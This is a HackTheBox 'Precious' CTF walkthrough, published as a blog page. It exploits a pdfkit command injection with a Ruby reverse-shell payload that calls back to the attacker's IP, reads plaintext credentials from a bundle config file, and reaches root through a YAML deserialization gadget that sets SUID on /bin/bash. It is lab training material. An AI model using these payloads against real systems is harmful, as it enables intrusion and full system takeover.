@@ -1,0 +1,252 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HackTheBox Precious // 53CTF</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.108.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="5YC10P5" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.1b165e60871be07c93da04ef30238e50223c9da30f957d760f25b24143926af9.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HackTheBox Precious"/>
+<meta name="twitter:description" content="Name: Precious IP: 10.10.11.189 Defficulty: Easy OS: Linux Author: Nauten Nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.4p1 Debian 5&#43;deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 845e13a8e31e20661d235550f63047d2 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEAPxqUubE88njHItE&#43;mjeWJXOLu5reIBmQHCYh2ETYO5zatgel&#43;LjcYdgaa4KLFyw8CfDbRL9swlmGTaf4iUbao4jD73HV9/Vrnby7zP04OH3U/wVbAKbPJrjnva/czuuV6uNz4SVA3qk0bp6wOrxQFzCn5OvY3FTcceH1jrjrJmUKpGZJBZZO6cp0HkZWs/eQi8F7anVoMDKiiuP0VX28q/yR1AFB4vR5ej8iV/X73z3GOs3ZckQMhOiBmu1FF77c7VW1zqln480/AbvHJDULtRdZ5xrYH1nFynnPi6&#43;VU/PIfVMpHbYu7t0mEFeI5HxMPNUvtYRRDC14jEtH6RpZxd7PhwYiBctiybZbonM5UP0lP85OuMMPcSMll65&#43;8hzMMY2aejjHTYqgzd7M6HxcEMrJW7n7s5eCJqMoUXkL8RSBEQSmMUV8iWzHW0XkVUfYT5Ko6Xsnb&#43;DiiLvFNUlFwO6hWz2WG8rlZ3voQ/gv8BLVCU1ziaVGerd61PODck= | 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFScv6lLa14Uczimjt1W7qyH6OvXIyJGrznL1JXzgVFdABwi/oWWxUzEvwP5OMki1SW9QKX7kKVznWgFNOp815Y= | 256 33053dcd7ab798458239e7ae3c91a658 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH&#43;JGiTFGOgn/iJUoLhZeybUvKeADIlm0fHnP/oZ66Qb 80/tcp open http syn-ack nginx 1.18.0 |_http-server-header: nginx/1.18.0 |_http-title: Did not follow redirect to http://precious.htb/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Two ports are open."/>
+
+    <meta property="og:title" content="HackTheBox Precious" />
+<meta property="og:description" content="Name: Precious IP: 10.10.11.189 Defficulty: Easy OS: Linux Author: Nauten Nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.4p1 Debian 5&#43;deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 845e13a8e31e20661d235550f63047d2 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEAPxqUubE88njHItE&#43;mjeWJXOLu5reIBmQHCYh2ETYO5zatgel&#43;LjcYdgaa4KLFyw8CfDbRL9swlmGTaf4iUbao4jD73HV9/Vrnby7zP04OH3U/wVbAKbPJrjnva/czuuV6uNz4SVA3qk0bp6wOrxQFzCn5OvY3FTcceH1jrjrJmUKpGZJBZZO6cp0HkZWs/eQi8F7anVoMDKiiuP0VX28q/yR1AFB4vR5ej8iV/X73z3GOs3ZckQMhOiBmu1FF77c7VW1zqln480/AbvHJDULtRdZ5xrYH1nFynnPi6&#43;VU/PIfVMpHbYu7t0mEFeI5HxMPNUvtYRRDC14jEtH6RpZxd7PhwYiBctiybZbonM5UP0lP85OuMMPcSMll65&#43;8hzMMY2aejjHTYqgzd7M6HxcEMrJW7n7s5eCJqMoUXkL8RSBEQSmMUV8iWzHW0XkVUfYT5Ko6Xsnb&#43;DiiLvFNUlFwO6hWz2WG8rlZ3voQ/gv8BLVCU1ziaVGerd61PODck= | 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFScv6lLa14Uczimjt1W7qyH6OvXIyJGrznL1JXzgVFdABwi/oWWxUzEvwP5OMki1SW9QKX7kKVznWgFNOp815Y= | 256 33053dcd7ab798458239e7ae3c91a658 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH&#43;JGiTFGOgn/iJUoLhZeybUvKeADIlm0fHnP/oZ66Qb 80/tcp open http syn-ack nginx 1.18.0 |_http-server-header: nginx/1.18.0 |_http-title: Did not follow redirect to http://precious.htb/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Two ports are open." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://53ctf.github.io/posts/htb/precious/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-16T11:30:41+05:30" />
+<meta property="article:modified_time" content="2023-01-16T11:30:41+05:30" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://53ctf.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="5YC10P5" /></a>
+      <span class="app-header-title">53CTF</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/hackthebox/">HTB</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/notes/">Notes</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>This is where I keep my notes and also where I post articles, writeups, walkthroughs and stuff like that so everybody else can learn something out of it.....</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/53ctf" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/syclops101" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://web.facebook.com/syclops101" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-facebook">
+  <title>HackTheBox</title>
+  <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HackTheBox Precious</h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jan 16, 2023
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://53ctf.github.io/tags/hackthebox/">HackTheBox</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <ul>
+<li>Name: Precious</li>
+<li>IP: 10.10.11.189</li>
+<li>Defficulty: Easy</li>
+<li>OS: Linux</li>
+<li>Author: <a href="https://www.hackthebox.com/home/users/profile/27582">Nauten</a></li>
+</ul>
+<h2 id="nmap">Nmap</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT   STATE SERVICE REASON  VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 845e13a8e31e20661d235550f63047d2 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEAPxqUubE88njHItE+mjeWJXOLu5reIBmQHCYh2ETYO5zatgel+LjcYdgaa4KLFyw8CfDbRL9swlmGTaf4iUbao4jD73HV9/Vrnby7zP04OH3U/wVbAKbPJrjnva/czuuV6uNz4SVA3qk0bp6wOrxQFzCn5OvY3FTcceH1jrjrJmUKpGZJBZZO6cp0HkZWs/eQi8F7anVoMDKiiuP0VX28q/yR1AFB4vR5ej8iV/X73z3GOs3ZckQMhOiBmu1FF77c7VW1zqln480/AbvHJDULtRdZ5xrYH1nFynnPi6+VU/PIfVMpHbYu7t0mEFeI5HxMPNUvtYRRDC14jEtH6RpZxd7PhwYiBctiybZbonM5UP0lP85OuMMPcSMll65+8hzMMY2aejjHTYqgzd7M6HxcEMrJW7n7s5eCJqMoUXkL8RSBEQSmMUV8iWzHW0XkVUfYT5Ko6Xsnb+DiiLvFNUlFwO6hWz2WG8rlZ3voQ/gv8BLVCU1ziaVGerd61PODck<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> a2ef7b9665ce4161c467ee4e96c7c892 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFScv6lLa14Uczimjt1W7qyH6OvXIyJGrznL1JXzgVFdABwi/oWWxUzEvwP5OMki1SW9QKX7kKVznWgFNOp815Y<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 33053dcd7ab798458239e7ae3c91a658 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH+JGiTFGOgn/iJUoLhZeybUvKeADIlm0fHnP/oZ66Qb
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack nginx 1.18.0
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://precious.htb/
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Two ports are open.</p>
+<ul>
+<li><strong>22/TCP SSH</strong>
+<ul>
+<li>OpenSSH 8.4p1</li>
+<li>And the banner says that this is a <code>Debian</code> Box</li>
+</ul>
+</li>
+<li><strong>80/TCP HTTP</strong>
+<ul>
+<li>nginx 1.18.0</li>
+<li>Add <code>precious.htb</code> into <code>/etc/hsots</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="web-enumeration">Web Enumeration</h2>
+<p><code>http://precious.htb</code> is a website where we can convert a webpage into an PDF.<br>
+<img src="images/web.png" alt="Site View"></p>
+<p>So let&rsquo;s host a webserver and test that out.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; sudo python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><p>Got to the <a href="http://precious.htb">http://precious.htb</a>. Then put your web address into the search box and submit.
+<img src="images/first%20test.png" alt="Site Test"></p>
+<p>As soon as we hit the submit button, we can see that it give us a PDF file to download.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>lfdtfqr4x2idaupq2c9gl7ll1kz9bz7q.pdf
+</span></span></code></pre></div><p>Let&rsquo;s analyze that PDF file a little bit more.
+If we view the <a href="https://en.wikipedia.org/wiki/Metadata">metadata</a> of the PDF with the <a href="https://github.com/exiftool/exiftool">ExifTool</a>, we can see that it has been generated by <a href="https://pdfkit.org/">pdfkit</a> v0.8.6.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; exiftool lfdtfqr4x2idaupq2c9gl7ll1kz9bz7q.pdf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ExifTool Version Number         : 12.50
+</span></span><span style="display:flex;"><span>File Name                       : lfdtfqr4x2idaupq2c9gl7ll1kz9bz7q.pdf
+</span></span><span style="display:flex;"><span>Directory                       : .
+</span></span><span style="display:flex;"><span>File Size                       : <span style="color:#ae81ff">17</span> kB
+</span></span><span style="display:flex;"><span>File Modification Date/Time     : 2023:01:01 13:02:29+05:30
+</span></span><span style="display:flex;"><span>File Access Date/Time           : 2023:01:01 13:02:29+05:30
+</span></span><span style="display:flex;"><span>File Inode Change Date/Time     : 2023:01:01 13:04:39+05:30
+</span></span><span style="display:flex;"><span>File Permissions                : -rw-r--r--
+</span></span><span style="display:flex;"><span>File Type                       : PDF
+</span></span><span style="display:flex;"><span>File Type Extension             : pdf
+</span></span><span style="display:flex;"><span>MIME Type                       : application/pdf
+</span></span><span style="display:flex;"><span>PDF Version                     : 1.4
+</span></span><span style="display:flex;"><span>Linearized                      : No
+</span></span><span style="display:flex;"><span>Page Count                      : <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Creator                         : Generated by pdfkit v0.8.6
+</span></span></code></pre></div><p>And if we look for a exploit for that specific version of PDFKit, we can find a <a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">Command Injection Vulnerability</a>.</p>
+<p>The way this vulnerability works is If the provided parameter happens to contain a URL encoded character and a shell command substitution string, it will be included in the command that PDFKit executes to render the PDF.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span>irb(main):<span style="color:#ae81ff">060</span>:<span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span> puts <span style="color:#66d9ef">PDFKit</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;http://example.com/?name=</span><span style="color:#e6db74">#{</span><span style="color:#e6db74">&#39;%20`sleep 5`&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>command wkhtmltopdf <span style="color:#f92672">--</span>quiet <span style="color:#f92672">[...]</span> <span style="color:#e6db74">&#34;http://example.com/?name=%20`sleep 5`&#34;</span> <span style="color:#f92672">-</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">nil</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">PDFKit</span><span style="color:#f92672">.</span>new(<span style="color:#e6db74">&#34;http://example.com/?name=</span><span style="color:#e6db74">#{</span><span style="color:#e6db74">&#39;%20`sleep 5`&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>to_pdf <span style="color:#75715e"># 5 seconds wait... </span>
+</span></span></code></pre></div><p>So let&rsquo;s exploit this vulnerability on <code>http://precious.htb</code> and test if it works or not.</p>
+<p>Provide the payload like below.</p>
+<pre tabindex="0"><code>http://10.10.14.16/?name=%20`id`
+</code></pre><p><img src="images/test_exploit.png" alt="Exploit Test"></p>
+<p>And after we submit it, we can see the results of the <code>id</code> command within the PDF file.
+<img src="images/test_pdf.png" alt="PDF Test"></p>
+<h2 id="foothold-ruby">Foothold [Ruby]</h2>
+<p>Since now we have the <strong>Command Injection</strong> on the box, let&rsquo;s get a reverse shell. Since the <a href="https://github.com/pdfkit/pdfkit">PDFKit</a> is writen in 100% ruby, the box must have ruby installed on it. Therefore we can try a ruby payload to get a reverse shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rb" data-lang="rb"><span style="display:flex;"><span><span style="color:#e6db74">http</span>:<span style="color:#e6db74">//</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">14</span><span style="color:#f92672">.</span><span style="color:#ae81ff">16</span><span style="color:#f92672">/</span>?name<span style="color:#f92672">=%</span><span style="color:#ae81ff">20</span><span style="color:#e6db74">`ruby -rsocket -e&#39;spawn(&#34;sh&#34;,[:in,:out,:err]=&gt;TCPSocket.new(&#34;10.10.14.16&#34;,5369))&#39;`</span>
+</span></span></code></pre></div><p>And we got a shell as the <code>ruby</code> user.</p>
+<h2 id="privesc-henry">Privesc [Henry]</h2>
+<p>In the <code>home</code> directory of the <code>ruby</code> user, there is direcroty name <code>.bundle</code>. Inside of that directory there is <code>config</code> file which contains credentials of the user <code>henry</code> within it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ruby@precious:~/.bundle$ cat config
+</span></span><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>BUNDLE_HTTPS://RUBYGEMS__ORG/: <span style="color:#e6db74">&#34;henry:Q3c************YFH&#34;</span>
+</span></span></code></pre></div><p>So let&rsquo;s log into the box as the <code>henry</code> user and capture the user flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>henry@precious:~$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>henry<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>henry<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>henry<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>henry@precious:~$ cat user.txt
+</span></span><span style="display:flex;"><span>323**************************a9a
+</span></span></code></pre></div><h2 id="privesc-root">Privesc [Root]</h2>
+<p>The <code>henry</code> user can run <code>/opt/update_dependencies.rb</code> as the <code>root</code> user with no password.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>henry@precious:~$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> henry on precious:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User henry may run the following commands on precious:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+</span></span></code></pre></div><p>If we view <code>/opt/update_dependencies.rb</code>, we can see that it tries to load a file name <code>dependencies.yml</code> and which by-the-way has no absolute path. That means we can create <code>dependencies.yml</code> anywhere we want and run the <code>/opt/update_dependencies.rb</code> where we created the <code>dependencies.yml</code> file.</p>
+<p>This is a <a href="https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Insecure%20Deserialization/YAML/#pyyaml">YAML Deserialization</a> attack. We can poison the <code>dependencies.yml</code> to run system commands as the <code>root</code> user <em>(because the <code>/opt/update_dependencies.rb</code> is owned by the <code>root</code> user and the fact that we can run it as the <code>root</code> user)</em>.</p>
+<p>Let&rsquo;s create <code>dependencies.yml</code> file inside of the user <code>henry</code>&rsquo;s home directory. The malicious <code>dependencies.yml</code> file would looks like this. With this we can add the <a href="https://www.redhat.com/sysadmin/suid-sgid-sticky-bit">SUID</a> bit to <code>/bin/bash</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span>---
+</span></span><span style="display:flex;"><span>- !<span style="color:#ae81ff">ruby/object:Gem::Installer</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">i</span>: <span style="color:#ae81ff">x</span>
+</span></span><span style="display:flex;"><span>- !<span style="color:#ae81ff">ruby/object:Gem::SpecFetcher</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">i</span>: <span style="color:#66d9ef">y</span>
+</span></span><span style="display:flex;"><span>- !<span style="color:#ae81ff">ruby/object:Gem::Requirement</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">requirements</span>:
+</span></span><span style="display:flex;"><span>    !<span style="color:#ae81ff">ruby/object:Gem::Package::TarReader</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">io</span>: <span style="color:#75715e">&amp;1</span> !<span style="color:#ae81ff">ruby/object:Net::BufferedIO</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">io</span>: <span style="color:#75715e">&amp;1</span> !<span style="color:#ae81ff">ruby/object:Gem::Package::TarReader::Entry</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">read</span>: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">header</span>: <span style="color:#e6db74">&#34;abc&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">debug_output</span>: <span style="color:#75715e">&amp;1</span> !<span style="color:#ae81ff">ruby/object:Net::WriteAdapter</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">socket</span>: <span style="color:#75715e">&amp;1</span> !<span style="color:#ae81ff">ruby/object:Gem::RequestSet</span>
+</span></span><span style="display:flex;"><span>             <span style="color:#f92672">sets</span>: !<span style="color:#ae81ff">ruby/object:Net::WriteAdapter</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#f92672">socket</span>: !<span style="color:#ae81ff">ruby/module &#39;Kernel&#39;</span>
+</span></span><span style="display:flex;"><span>                 <span style="color:#f92672">method_id</span>: :<span style="color:#ae81ff">system</span>
+</span></span><span style="display:flex;"><span>             <span style="color:#f92672">git_set</span>: <span style="color:#ae81ff">chmod u+s /bin/bash</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#f92672">method_id</span>: :<span style="color:#ae81ff">resolve</span>
+</span></span></code></pre></div><p>And then run the <code>/opt/update_dependencies.rb</code> file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -u root /usr/bin/ruby /opt/update_dependencies.rb
+</span></span></code></pre></div><p>And as we can see, <code>/bin/bash</code> now has SUID bit bind to it. Let&rsquo;s become the <code>root</code> and capture the root flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>henry@precious:~$ ls -la /bin/bash
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1234376</span> Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2022</span> /bin/bash
+</span></span><span style="display:flex;"><span>henry@precious:~$ /bin/bash -p
+</span></span><span style="display:flex;"><span>bash-5.1# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span><span style="display:flex;"><span>bash-5.1# id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>henry<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>henry<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>henry<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>bash-5.1# cat /root/root.txt
+</span></span><span style="display:flex;"><span>74f**************************f1a
+</span></span></code></pre></div><h2 id="root-uninteded">Root [Uninteded]</h2>
+<p>Once we logged in to the box as the user <code>henry</code>, we can create a symlink to <code>/root/root.txt</code> in the home directory of the user <code>henry</code> as we created the <code>dependencies.yml</code> file.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>henry@precious:~$ ln -s /root/root.txt dependencies.yml
+</span></span><span style="display:flex;"><span>henry@precious:~$ ls
+</span></span><span style="display:flex;"><span>dependencies.yml  user.txt
+</span></span></code></pre></div><p>And then run <code>/opt/update_dependencies.rb</code> as <code>root</code> and capture the root flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>henry@precious:~$ sudo -u root /usr/bin/ruby /opt/update_dependencies.rb
+</span></span><span style="display:flex;"><span>Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>/opt/update_dependencies.rb:20:in <span style="color:#e6db74">`</span>&lt;main&gt;<span style="color:#e6db74">&#39;: undefined method `each&#39;</span> <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#34;74f**************************f1a&#34;</span>:String <span style="color:#f92672">(</span>NoMethodError<span style="color:#f92672">)</span>
+</span></span></code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
